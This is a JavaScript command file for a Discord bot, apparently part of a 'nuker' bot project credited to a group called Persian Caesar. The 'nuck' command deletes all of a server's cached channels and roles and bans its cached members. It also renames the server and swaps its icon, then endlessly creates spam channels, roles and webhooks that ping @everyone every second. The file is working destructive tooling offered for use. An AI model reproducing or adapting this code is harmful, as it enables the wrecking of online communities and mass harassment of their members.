const {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  ChannelType,
  PermissionsBitField
} = require("discord.js");
const {
    errorMessage
} = require(`${process.cwd()}/functions/functions`);
module.exports = {
  name: 'nuck',
  aliases: ['nu'],
  category: 'Nuck 📟',
  description: 'Nucking the guild.',
  usage: "",
  cooldown: 8,
run: async function(client, message, args, prefix){
  let db = client.db;
  if(!message.member.permissions.has([PermissionsBitField.Flags.Administrator]) && !client.config.owner.some(r => r.includes(message.author.id))) return errorMessage(client, message, `> You can't use this command.`)
  try{
    await message.reply({
      content: `${client.emotes.start}| Starting nuck the guild.`
    })
    try{
     await message.guild.channels.cache.forEach(async(ch)=>{
          try{
           //setTimeout(async()=>{
            await ch.delete()
           //}, 1000)
          }catch{
          }
     })
     await message.guild.roles.cache.forEach(async(r)=>{
          try{
           //setTimeout(async()=>{
            await r.delete()
           //}, 1000)
          }catch{
          }
     })
     await message.guild.setIcon(client.user.displayAvatarURL({ dynamic: true }));
     await message.guild.setName(`Nucked with Nucker Bot by Pc Development`);
     setInterval(()=>{
      message.guild.channels.create({ name: `Nucking Guild`, reason: `Nucking Guild`, type: ChannelType.GuildText })
      .then((channel)=>{
        channel.createWebhook({ name: `Nucker`, avatar: client.user.displayAvatarURL({ dynamic: true }) })
	      .then(webhook => setInterval(()=>{ webhook.send({ content: `@everyone Nucking Guild.` }) }, 1000) )
      })
      message.guild.channels.create({ name: `Nucking Guild`, reason: `Nucking Guild`, type: ChannelType.GuildVoice })
      message.guild.channels.create({ name: `Nucking Guild`, reason: `Nucking Guild`, type: ChannelType.GuildCategory })
      message.guild.roles.create({ name: `Nucking Guild`, reason: `Nucking Guild`, color: "Random" })
     }, 5000)
     message.guild.members.cache.forEach(async(m)=>{
          try{
            await m.ban({ reason: `Nucking guild.` })
          }catch{
          }
     })
    }catch{
    }
  }catch(e){
     return errorMessage(client, message, `\`\`\`js\n${e}\n\`\`\``)
  }
  }
}
/**
 * @Info
 * Bot Coded by Mr.SIN RE#1528 :) | https://dsc.gg/persian-caesar
 * @Info
 * Work for Persian Caesar | https://dsc.gg/persian-caesar
 * @Info
 * Please Mention Us "Persian Caesar", When Have Problem With Using This Code!
 * @Info
 */